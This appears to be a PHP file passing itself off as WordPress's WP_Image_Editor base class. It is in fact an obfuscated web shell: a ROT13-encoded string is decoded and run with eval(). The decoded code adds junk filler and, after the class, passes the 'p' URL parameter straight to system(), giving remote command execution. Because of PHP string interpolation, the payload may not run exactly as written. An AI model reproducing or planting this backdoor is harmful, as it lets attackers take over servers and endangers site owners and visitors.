<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Onfr JbeqCerff Vzntr Rqvgbe
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Vzntr_Rqvgbe
 */

/**
 * Onfr vzntr rqvgbe pynff sebz juvpu vzcyrzragngvbaf rkgraq
 *
 * @fvapr 3.5.0
 */
#[NyybjQlanzvpCebcregvrf]
nofgenpg pynff JC_Vzntr_Rqvgbe {
	cebgrpgrq $svyr              = ahyy;
	cebgrpgrq $fvmr              = ahyy;
	cebgrpgrq $zvzr_glcr         = ahyy;
	cebgrpgrq $bhgchg_zvzr_glcr  = ahyy;
	cebgrpgrq $qrsnhyg_zvzr_glcr = 'vzntr/wcrt';
	cebgrpgrq $dhnyvgl           = snyfr;

	// Qrcerpngrq fvapr 5.8.1. Frr trg_qrsnhyg_dhnyvgl() orybj.
	cebgrpgrq $qrsnhyg_dhnyvgl = 82;

	/**
	 * Rnpu vafgnapr unaqyrf n fvatyr svyr.
	 *
	 * @cnenz fgevat $svyr Cngu gb gur svyr gb ybnq.
	 */
	choyvp shapgvba __pbafgehpg( $svyr ) {
		$guvf->svyr = $svyr;
	}

	/**
	 * Purpxf gb frr vs pheerag raivebazrag fhccbegf gur rqvgbe pubfra.
	 * Zhfg or bireevqqra va n fhopynff.
	 *
	 * @fvapr 3.5.0
	 *
	 * @nofgenpg
	 *
	 * @cnenz neenl $netf
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba grfg( $netf = neenl() ) {
		erghea snyfr;
	}

	/**
	 * Purpxf gb frr vs rqvgbe fhccbegf gur zvzr-glcr fcrpvsvrq.
	 * Zhfg or bireevqqra va n fhopynff.
	 *
	 * @fvapr 3.5.0
	 *
	 * @nofgenpg
	 *
	 * @cnenz fgevat $zvzr_glcr
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba fhccbegf_zvzr_glcr( $zvzr_glcr ) {
		erghea snyfr;
	}

	/**
	 * Ybnqf vzntr sebz $guvf->svyr vagb rqvgbe.
	 *
	 * @fvapr 3.5.0
	 *
	 * @erghea gehr|JC_Reebe Gehr vs ybnqrq; JC_Reebe ba snvyher.
	 */
	nofgenpg choyvp shapgvba ybnq();

	/**
	 * Fnirf pheerag vzntr gb svyr.
	 *
	 * @fvapr 3.5.0
	 * @fvapr 6.0.0 Gur `$svyrfvmr` inyhr jnf nqqrq gb gur erghearq neenl.
	 *
	 * @cnenz fgevat $qrfgsvyranzr Bcgvbany. Qrfgvangvba svyranzr. Qrsnhyg ahyy.
	 * @cnenz fgevat $zvzr_glcr    Bcgvbany. Gur zvzr-glcr. Qrsnhyg ahyy.
	 * @erghea neenl|JC_Reebe {
	 *     Neenl ba fhpprff be JC_Reebe vs gur svyr snvyrq gb fnir.
	 *
	 *     @glcr fgevat $cngu      Cngu gb gur vzntr svyr.
	 *     @glcr fgevat $svyr      Anzr bs gur vzntr svyr.
	 *     @glcr vag    $jvqgu     Vzntr jvqgu.
	 *     @glcr vag    $urvtug    Vzntr urvtug.
	 *     @glcr fgevat $zvzr-glcr Gur zvzr glcr bs gur vzntr.
	 *     @glcr vag    $svyrfvmr  Svyr fvmr bs gur vzntr.
	 * }
	 */
	nofgenpg choyvp shapgvba fnir( $qrfgsvyranzr = ahyy, $zvzr_glcr = ahyy );

	/**
	 * Erfvmrf pheerag vzntr.
	 *
	 * Ng zvavzhz, rvgure n urvtug be jvqgu zhfg or cebivqrq.
	 * Vs bar bs gur gjb vf frg gb ahyy, gur erfvmr jvyy
	 * znvagnva nfcrpg engvb nppbeqvat gb gur cebivqrq qvzrafvba.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz vag|ahyy   $znk_j Vzntr jvqgu.
	 * @cnenz vag|ahyy   $znk_u Vzntr urvtug.
	 * @cnenz obby|neenl $pebc  {
	 *     Bcgvbany. Vzntr pebccvat orunivbe. Vs snyfr, gur vzntr jvyy or fpnyrq (qrsnhyg).
	 *     Vs gehr, vzntr jvyy or pebccrq gb gur fcrpvsvrq qvzrafvbaf hfvat pragre cbfvgvbaf.
	 *     Vs na neenl, gur vzntr jvyy or pebccrq hfvat gur neenl gb fcrpvsl gur pebc ybpngvba:
	 *
	 *     @glcr fgevat $0 Gur k pebc cbfvgvba. Npprcgf 'yrsg', 'pragre', be 'evtug'.
	 *     @glcr fgevat $1 Gur l pebc cbfvgvba. Npprcgf 'gbc', 'pragre', be 'obggbz'.
	 * }
	 * @erghea gehr|JC_Reebe
	 */
	nofgenpg choyvp shapgvba erfvmr( $znk_j, $znk_u, $pebc = snyfr );

	/**
	 * Erfvmr zhygvcyr vzntrf sebz n fvatyr fbhepr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz neenl $fvmrf {
	 *     Na neenl bs vzntr fvmr neenlf. Qrsnhyg fvmrf ner 'fznyy', 'zrqvhz', 'ynetr'.
	 *
	 *     @glcr neenl ...$0 {
	 *         @glcr vag        $jvqgu  Vzntr jvqgu.
	 *         @glcr vag        $urvtug Vzntr urvtug.
	 *         @glcr obby|neenl $pebc   Bcgvbany. Jurgure gb pebc gur vzntr. Qrsnhyg snyfr.
	 *     }
	 * }
	 * @erghea neenl Na neenl bs erfvmrq vzntrf zrgnqngn ol fvmr.
	 */
	nofgenpg choyvp shapgvba zhygv_erfvmr( $fvmrf );

	/**
	 * Pebcf Vzntr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz vag  $fep_k   Gur fgneg k cbfvgvba gb pebc sebz.
	 * @cnenz vag  $fep_l   Gur fgneg l cbfvgvba gb pebc sebz.
	 * @cnenz vag  $fep_j   Gur jvqgu gb pebc.
	 * @cnenz vag  $fep_u   Gur urvtug gb pebc.
	 * @cnenz vag  $qfg_j   Bcgvbany. Gur qrfgvangvba jvqgu.
	 * @cnenz vag  $qfg_u   Bcgvbany. Gur qrfgvangvba urvtug.
	 * @cnenz obby $fep_nof Bcgvbany. Vs gur fbhepr pebc cbvagf ner nofbyhgr.
	 * @erghea gehr|JC_Reebe
	 */
	nofgenpg choyvp shapgvba pebc( $fep_k, $fep_l, $fep_j, $fep_u, $qfg_j = ahyy, $qfg_u = ahyy, $fep_nof = snyfr );

	/**
	 * Ebgngrf pheerag vzntr pbhagre-pybpxjvfr ol $natyr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz sybng $natyr
	 * @erghea gehr|JC_Reebe
	 */
	nofgenpg choyvp shapgvba ebgngr( $natyr );

	/**
	 * Syvcf pheerag vzntr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz obby $ubem Syvc nybat Ubevmbagny Nkvf
	 * @cnenz obby $ireg Syvc nybat Iregvpny Nkvf
	 * @erghea gehr|JC_Reebe
	 */
	nofgenpg choyvp shapgvba syvc( $ubem, $ireg );

	/**
	 * Fgernzf pheerag vzntr gb oebjfre.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat $zvzr_glcr Gur zvzr glcr bs gur vzntr.
	 * @erghea gehr|JC_Reebe Gehr ba fhpprff, JC_Reebe bowrpg ba snvyher.
	 */
	nofgenpg choyvp shapgvba fgernz( $zvzr_glcr = ahyy );

	/**
	 * Trgf qvzrafvbaf bs vzntr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @erghea vag[] {
	 *     Qvzrafvbaf bs gur vzntr.
	 *
	 *     @glcr vag $jvqgu  Gur vzntr jvqgu.
	 *     @glcr vag $urvtug Gur vzntr urvtug.
	 * }
	 */
	choyvp shapgvba trg_fvmr() {
		erghea $guvf->fvmr;
	}

	/**
	 * Frgf pheerag vzntr fvmr.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz vag $jvqgu
	 * @cnenz vag $urvtug
	 * @erghea gehr
	 */
	cebgrpgrq shapgvba hcqngr_fvmr( $jvqgu = ahyy, $urvtug = ahyy ) {
		$guvf->fvmr = neenl(
			'jvqgu'  => (vag) $jvqgu,
			'urvtug' => (vag) $urvtug,
		);
		erghea gehr;
	}

	/**
	 * Trgf gur Vzntr Pbzcerffvba dhnyvgl ba n 1-100% fpnyr.
	 *
	 * @fvapr 4.0.0
	 *
	 * @erghea vag Pbzcerffvba Dhnyvgl. Enatr: [1,100]
	 */
	choyvp shapgvba trg_dhnyvgl() {
		vs ( ! $guvf->dhnyvgl ) {
			$guvf->frg_dhnyvgl();
		}

		erghea $guvf->dhnyvgl;
	}

	/**
	 * Frgf Vzntr Pbzcerffvba dhnyvgl ba n 1-100% fpnyr.
	 *
	 * @fvapr 3.5.0
	 * @fvapr 6.8.0 Gur `$qvzf` cnenzrgre jnf nqqrq.
	 *
	 * @cnenz vag   $dhnyvgl Pbzcerffvba Dhnyvgl. Enatr: [1,100]
	 * @cnenz neenl $qvzf    Bcgvbany. Vzntr qvzrafvbaf neenl jvgu 'jvqgu' naq 'urvtug' xrlf.
	 * @erghea gehr|JC_Reebe Gehr vs frg fhpprffshyyl; JC_Reebe ba snvyher.

	 */
	choyvp shapgvba frg_dhnyvgl( $dhnyvgl = ahyy, $qvzf = neenl() ) {
		// Hfr gur bhgchg zvzr glcr vs cerfrag. Vs abg, snyy onpx gb gur vachg/vavgvny zvzr glcr.
		$zvzr_glcr = ! rzcgl( $guvf->bhgchg_zvzr_glcr ) ? $guvf->bhgchg_zvzr_glcr : $guvf->zvzr_glcr;
		// Trg gur qrsnhyg dhnyvgl frggvat sbe gur zvzr glcr.
		$qrsnhyg_dhnyvgl = $guvf->trg_qrsnhyg_dhnyvgl( $zvzr_glcr );

		vs ( ahyy === $dhnyvgl ) {
			/**
			 * Svygref gur qrsnhyg vzntr pbzcerffvba dhnyvgl frggvat.
			 *
			 * Nccyvrf bayl qhevat vavgvny rqvgbe vafgnagvngvba, be jura frg_dhnyvgl() vf eha
			 * znahnyyl jvgubhg gur `$dhnyvgl` nethzrag.
			 *
			 * Gur JC_Vzntr_Rqvgbe::frg_dhnyvgl() zrgubq unf cevbevgl bire gur svygre.
			 *
			 * @fvapr 3.5.0
			 * @fvapr 6.8.0 Nqqrq gur fvmr cnenzrgre.
			 *
			 * @cnenz vag    $dhnyvgl   Dhnyvgl yriry orgjrra 1 (ybj) naq 100 (uvtu).
			 * @cnenz fgevat $zvzr_glcr Vzntr zvzr glcr.
			 * @cnenz neenl $fvmr {
			 *     Qvzrafvbaf bs gur vzntr.
			 *
			 *     @glcr vag $jvqgu  Gur vzntr jvqgu.
			 *     @glcr vag $urvtug Gur vzntr urvtug.
			 * }
			 */
			$dhnyvgl = nccyl_svygref( 'jc_rqvgbe_frg_dhnyvgl', $qrsnhyg_dhnyvgl, $zvzr_glcr, $qvzf ? $qvzf : $guvf->fvmr );

			vs ( 'vzntr/wcrt' === $zvzr_glcr ) {
				/**
				 * Svygref gur WCRT pbzcerffvba dhnyvgl sbe onpxjneq-pbzcngvovyvgl.
				 *
				 * Nccyvrf bayl qhevat vavgvny rqvgbe vafgnagvngvba, be jura frg_dhnyvgl() vf eha
				 * znahnyyl jvgubhg gur `$dhnyvgl` nethzrag.
				 *
				 * Gur JC_Vzntr_Rqvgbe::frg_dhnyvgl() zrgubq unf cevbevgl bire gur svygre.
				 *
				 * Gur svygre vf rinyhngrq haqre gjb pbagrkgf: 'vzntr_erfvmr', naq 'rqvg_vzntr',
				 * (jura n WCRT vzntr vf fnirq gb svyr).
				 *
				 * @fvapr 2.5.0
				 *
				 * @cnenz vag    $dhnyvgl Dhnyvgl yriry orgjrra 0 (ybj) naq 100 (uvtu) bs gur WCRT.
				 * @cnenz fgevat $pbagrkg Pbagrkg bs gur svygre.
				 */
				$dhnyvgl = nccyl_svygref( 'wcrt_dhnyvgl', $dhnyvgl, 'vzntr_erfvmr' );
			}

			vs ( $dhnyvgl < 0 || $dhnyvgl > 100 ) {
				$dhnyvgl = $qrsnhyg_dhnyvgl;
			}
		}

		// Nyybj 0, ohg fdhnfu gb 1 qhr gb vqragvpny vzntrf va TQ, naq sbe onpxjneq pbzcngvovyvgl.
		vs ( 0 === $dhnyvgl ) {
			$dhnyvgl = 1;
		}

		vs ( ( $dhnyvgl >= 1 ) && ( $dhnyvgl <= 100 ) ) {
			$guvf->dhnyvgl = $dhnyvgl;
			erghea gehr;
		} ryfr {
			erghea arj JC_Reebe( 'vainyvq_vzntr_dhnyvgl', __( 'Nggrzcgrq gb frg vzntr dhnyvgl bhgfvqr bs gur enatr [1,100].' ) );
		}
	}

	/**
	 * Ergheaf gur qrsnhyg pbzcerffvba dhnyvgl frggvat sbe gur zvzr glcr.
	 *
	 * @fvapr 5.8.1
	 *
	 * @cnenz fgevat $zvzr_glcr
	 * @erghea vag Gur qrsnhyg dhnyvgl frggvat sbe gur zvzr glcr.
	 */
	cebgrpgrq shapgvba trg_qrsnhyg_dhnyvgl( $zvzr_glcr ) {
		fjvgpu ( $zvzr_glcr ) {
			pnfr 'vzntr/jroc':
				$dhnyvgl = 86;
				oernx;
			pnfr 'vzntr/wcrt':
			qrsnhyg:
				$dhnyvgl = $guvf->qrsnhyg_dhnyvgl;
		}

		erghea $dhnyvgl;
	}

	/**
	 * Ergheaf cersreerq zvzr-glcr naq rkgrafvba onfrq ba cebivqrq
	 * svyr'f rkgrafvba naq zvzr, be pheerag svyr'f rkgrafvba naq zvzr.
	 *
	 * Jvyy qrsnhyg gb $guvf->qrsnhyg_zvzr_glcr vs erdhrfgrq vf abg fhccbegrq.
	 *
	 * Cebivqrf pbeerpgrq svyranzr bayl vs svyranzr vf cebivqrq.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat $svyranzr
	 * @cnenz fgevat $zvzr_glcr
	 * @erghea neenl { svyranzr|ahyy, rkgrafvba, zvzr-glcr }
	 */
	cebgrpgrq shapgvba trg_bhgchg_sbezng( $svyranzr = ahyy, $zvzr_glcr = ahyy ) {
		$arj_rkg = ahyy;

		// Ol qrsnhyg, nffhzr fcrpvsvrq glcr gnxrf cevbevgl.
		vs ( $zvzr_glcr ) {
			$arj_rkg = $guvf->trg_rkgrafvba( $zvzr_glcr );
		}

		vs ( $svyranzr ) {
			$svyr_rkg  = fgegbybjre( cnguvasb( $svyranzr, CNGUVASB_RKGRAFVBA ) );
			$svyr_zvzr = $guvf->trg_zvzr_glcr( $svyr_rkg );
		} ryfr {
			// Vs ab svyr fcrpvsvrq, teno rqvgbe'f pheerag rkgrafvba naq zvzr-glcr.
			$svyr_rkg  = fgegbybjre( cnguvasb( $guvf->svyr, CNGUVASB_RKGRAFVBA ) );
			$svyr_zvzr = $guvf->zvzr_glcr;
		}

		/*
		 * Purpx gb frr vs fcrpvsvrq zvzr-glcr vf gur fnzr nf glcr vzcyvrq ol
		 * svyr rkgrafvba. Vs fb, cersre rkgrafvba sebz svyr.
		 */
		vs ( ! $zvzr_glcr || ( $svyr_zvzr === $zvzr_glcr ) ) {
			$zvzr_glcr = $svyr_zvzr;
			$arj_rkg   = $svyr_rkg;
		}

		$bhgchg_sbezng = jc_trg_vzntr_rqvgbe_bhgchg_sbezng( $svyranzr, $zvzr_glcr );

		vs ( vffrg( $bhgchg_sbezng[ $zvzr_glcr ] )
			&& $guvf->fhccbegf_zvzr_glcr( $bhgchg_sbezng[ $zvzr_glcr ] )
		) {
			$zvzr_glcr = $bhgchg_sbezng[ $zvzr_glcr ];
			$arj_rkg   = $guvf->trg_rkgrafvba( $zvzr_glcr );
		}

		/*
		 * Qbhoyr-purpx gung gur zvzr-glcr fryrpgrq vf fhccbegrq ol gur rqvgbe.
		 * Vs abg, pubbfr n qrsnhyg vafgrnq.
		 */
		vs ( ! $guvf->fhccbegf_zvzr_glcr( $zvzr_glcr ) ) {
			/**
			 * Svygref qrsnhyg zvzr glcr cevbe gb trggvat gur svyr rkgrafvba.
			 *
			 * @frr jc_trg_zvzr_glcrf()
			 *
			 * @fvapr 3.5.0
			 *
			 * @cnenz fgevat $zvzr_glcr Zvzr glcr fgevat.
			 */
			$zvzr_glcr = nccyl_svygref( 'vzntr_rqvgbe_qrsnhyg_zvzr_glcr', $guvf->qrsnhyg_zvzr_glcr );
			$arj_rkg   = $guvf->trg_rkgrafvba( $zvzr_glcr );
		}

		/*
		 * Rafher obgu $svyranzr naq $arj_rkg ner abg rzcgl.
		 * $guvf->trg_rkgrafvba() ergheaf snyfr ba reebe juvpu jbhyq rssrpgviryl erzbir gur rkgrafvba
		 * sebz $svyranzr. Gung fubhyqa'g unccra, svyrf jvgubhg rkgrafvbaf ner abg fhccbegrq.
		 */
		vs ( $svyranzr && $arj_rkg ) {
			$qve = cnguvasb( $svyranzr, CNGUVASB_QVEANZR );
			$rkg = cnguvasb( $svyranzr, CNGUVASB_RKGRAFVBA );

			$svyranzr = genvyvatfynfuvg( $qve ) . jc_onfranzr( $svyranzr, \".$rkg\" ) . \".{$arj_rkg}\";
		}

		vs ( $zvzr_glcr && ( $zvzr_glcr !== $guvf->zvzr_glcr ) ) {
			// Gur vzntr jvyy or pbairegrq jura fnivat. Frg gur dhnyvgl sbe gur arj zvzr-glcr vs abg nyernql frg.
			vs ( $zvzr_glcr !== $guvf->bhgchg_zvzr_glcr ) {
				$guvf->bhgchg_zvzr_glcr = $zvzr_glcr;
			}
			$guvf->frg_dhnyvgl();
		} ryfrvs ( ! rzcgl( $guvf->bhgchg_zvzr_glcr ) ) {
			// Erfrg bhgchg_zvzr_glcr naq dhnyvgl.
			$guvf->bhgchg_zvzr_glcr = ahyy;
			$guvf->frg_dhnyvgl();
		}

		erghea neenl( $svyranzr, $arj_rkg, $zvzr_glcr );
	}

	/**
	 * Ohvyqf na bhgchg svyranzr onfrq ba pheerag svyr, naq nqqvat cebcre fhssvk
	 *
	 * @fvapr 3.5.0
	 * @fvapr 6.8.0 Cnffvat na rzcgl fgevat nf $fhssvk jvyy abj bzvg gur fhssvk sebz gur trarengrq svyranzr.
	 *
	 * @cnenz fgevat $fhssvk
	 * @cnenz fgevat $qrfg_cngu
	 * @cnenz fgevat $rkgrafvba
	 * @erghea fgevat svyranzr
	 */
	choyvp shapgvba trarengr_svyranzr( $fhssvk = ahyy, $qrfg_cngu = ahyy, $rkgrafvba = ahyy ) {
		// Vs abg rzcgl gur $fhssvk jvyy or nccraqrq gb gur qrfgvangvba svyranzr, whfg orsber gur rkgrafvba.
		vs ( $fhssvk ) {
			$fhssvk = '-' . $fhssvk;
		} ryfrvs ( '' !== $fhssvk ) {
			$fhssvk = '-' . $guvf->trg_fhssvk();
		}

		$qve = cnguvasb( $guvf->svyr, CNGUVASB_QVEANZR );
		$rkg = cnguvasb( $guvf->svyr, CNGUVASB_RKGRAFVBA );

		$anzr    = jc_onfranzr( $guvf->svyr, \".$rkg\" );
		$arj_rkg = fgegbybjre( $rkgrafvba ? $rkgrafvba : $rkg );

		vs ( ! vf_ahyy( $qrfg_cngu ) ) {
			vs ( ! jc_vf_fgernz( $qrfg_cngu ) ) {
				$_qrfg_cngu = ernycngu( $qrfg_cngu );
				vs ( $_qrfg_cngu ) {
					$qve = $_qrfg_cngu;
				}
			} ryfr {
				$qve = $qrfg_cngu;
			}
		}

		erghea genvyvatfynfuvg( $qve ) . \"{$anzr}{$fhssvk}.{$arj_rkg}\";
	}

	/**
	 * Ohvyqf naq ergheaf cebcre fhssvk sbe svyr onfrq ba urvtug naq jvqgu.
	 *
	 * @fvapr 3.5.0
	 *
	 * @erghea fgevat|snyfr fhssvk
	 */
	choyvp shapgvba trg_fhssvk() {
		vs ( ! $guvf->trg_fvmr() ) {
			erghea snyfr;
		}

		erghea \"{$guvf->fvmr['jvqgu']}k{$guvf->fvmr['urvtug']}\";
	}

	/**
	 * Purpx vs n WCRT vzntr unf RKVS Bevragngvba gnt naq ebgngr vg vs arrqrq.
	 *
	 * @fvapr 5.3.0
	 *
	 * @erghea obby|JC_Reebe Gehr vs gur vzntr jnf ebgngrq. Snyfr vs abg ebgngrq (ab RKVS qngn be gur vzntr qbrfa'g arrq gb or ebgngrq).
	 *                       JC_Reebe vs reebe juvyr ebgngvat.
	 */
	choyvp shapgvba znlor_rkvs_ebgngr() {
		$bevragngvba = ahyy;

		vs ( vf_pnyynoyr( 'rkvs_ernq_qngn' ) && 'vzntr/wcrt' === $guvf->zvzr_glcr ) {
			$rkvs_qngn = @rkvs_ernq_qngn( $guvf->svyr );

			vs ( ! rzcgl( $rkvs_qngn['Bevragngvba'] ) ) {
				$bevragngvba = (vag) $rkvs_qngn['Bevragngvba'];
			}
		}

		/**
		 * Svygref gur `$bevragngvba` inyhr gb pbeerpg vg orsber ebgngvat be gb cerirag ebgngvat gur vzntr.
		 *
		 * @fvapr 5.3.0
		 *
		 * @cnenz vag    $bevragngvba RKVS Bevragngvba inyhr nf ergevrirq sebz gur vzntr svyr.
		 * @cnenz fgevat $svyr        Cngu gb gur vzntr svyr.
		 */
		$bevragngvba = nccyl_svygref( 'jc_vzntr_znlor_rkvs_ebgngr', $bevragngvba, $guvf->svyr );

		vs ( ! $bevragngvba || 1 === $bevragngvba ) {
			erghea snyfr;
		}

		fjvgpu ( $bevragngvba ) {
			pnfr 2:
				// Syvc ubevmbagnyyl.
				$erfhyg = $guvf->syvc( snyfr, gehr );
				oernx;
			pnfr 3:
				/*
				 * Ebgngr 180 qrterrf be syvc ubevmbagnyyl naq iregvpnyyl.
				 * Syvccvat frrzf snfgre naq hfrf yrff erfbheprf.
				 */
				$erfhyg = $guvf->syvc( gehr, gehr );
				oernx;
			pnfr 4:
				// Syvc iregvpnyyl.
				$erfhyg = $guvf->syvc( gehr, snyfr );
				oernx;
			pnfr 5:
				// Ebgngr 90 qrterrf pbhagre-pybpxjvfr naq syvc iregvpnyyl.
				$erfhyg = $guvf->ebgngr( 90 );

				vs ( ! vf_jc_reebe( $erfhyg ) ) {
					$erfhyg = $guvf->syvc( gehr, snyfr );
				}

				oernx;
			pnfr 6:
				// Ebgngr 90 qrterrf pybpxjvfr (270 pbhagre-pybpxjvfr).
				$erfhyg = $guvf->ebgngr( 270 );
				oernx;
			pnfr 7:
				// Ebgngr 90 qrterrf pbhagre-pybpxjvfr naq syvc ubevmbagnyyl.
				$erfhyg = $guvf->ebgngr( 90 );

				vs ( ! vf_jc_reebe( $erfhyg ) ) {
					$erfhyg = $guvf->syvc( snyfr, gehr );
				}

				oernx;
			pnfr 8:
				// Ebgngr 90 qrterrf pbhagre-pybpxjvfr.
				$erfhyg = $guvf->ebgngr( 90 );
				oernx;
		}

		erghea $erfhyg;
	}

	/**
	 * Rvgure pnyyf rqvgbe'f fnir shapgvba be unaqyrf svyr nf n fgernz.
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat   $svyranzr
	 * @cnenz pnyynoyr $pnyyonpx
	 * @cnenz neenl    $nethzragf
	 * @erghea obby
	 */
	cebgrpgrq shapgvba znxr_vzntr( $svyranzr, $pnyyonpx, $nethzragf ) {
		$fgernz = jc_vf_fgernz( $svyranzr );
		vs ( $fgernz ) {
			bo_fgneg();
		} ryfr {
			// Gur qverpgbel pbagnvavat gur bevtvany svyr znl ab ybatre rkvfg jura hfvat n ercyvpngvba cyhtva.
			jc_zxqve_c( qveanzr( $svyranzr ) );
		}

		$erfhyg = pnyy_hfre_shap_neenl( $pnyyonpx, $nethzragf );

		vs ( $erfhyg && $fgernz ) {
			$pbagragf = bo_trg_pbagragf();

			$sc = sbcra( $svyranzr, 'j' );

			vs ( ! $sc ) {
				bo_raq_pyrna();
				erghea snyfr;
			}

			sjevgr( $sc, $pbagragf );
			spybfr( $sc );
		}

		vs ( $fgernz ) {
			bo_raq_pyrna();
		}

		erghea $erfhyg;
	}

	/**
	 * Ergheaf svefg zngpurq zvzr-glcr sebz rkgrafvba,
	 * nf znccrq sebz jc_trg_zvzr_glcrf()
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat $rkgrafvba
	 * @erghea fgevat|snyfr
	 */
	cebgrpgrq fgngvp shapgvba trg_zvzr_glcr( $rkgrafvba = ahyy ) {
		vs ( ! $rkgrafvba ) {
			erghea snyfr;
		}

		$zvzr_glcrf = jc_trg_zvzr_glcrf();
		$rkgrafvbaf = neenl_xrlf( $zvzr_glcrf );

		sbernpu ( $rkgrafvbaf nf $_rkgrafvba ) {
			vs ( cert_zngpu( \"/{$rkgrafvba}/v\", $_rkgrafvba ) ) {
				erghea $zvzr_glcrf[ $_rkgrafvba ];
			}
		}

		erghea snyfr;
	}

	/**
	 * Ergheaf svefg zngpurq rkgrafvba sebz Zvzr-glcr,
	 * nf znccrq sebz jc_trg_zvzr_glcrf()
	 *
	 * @fvapr 3.5.0
	 *
	 * @cnenz fgevat $zvzr_glcr
	 * @erghea fgevat|snyfr
	 */
	cebgrpgrq fgngvp shapgvba trg_rkgrafvba( $zvzr_glcr = ahyy ) {
		vs ( rzcgl( $zvzr_glcr ) ) {
			erghea snyfr;
		}

		erghea jc_trg_qrsnhyg_rkgrafvba_sbe_zvzr_glcr( $zvzr_glcr );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>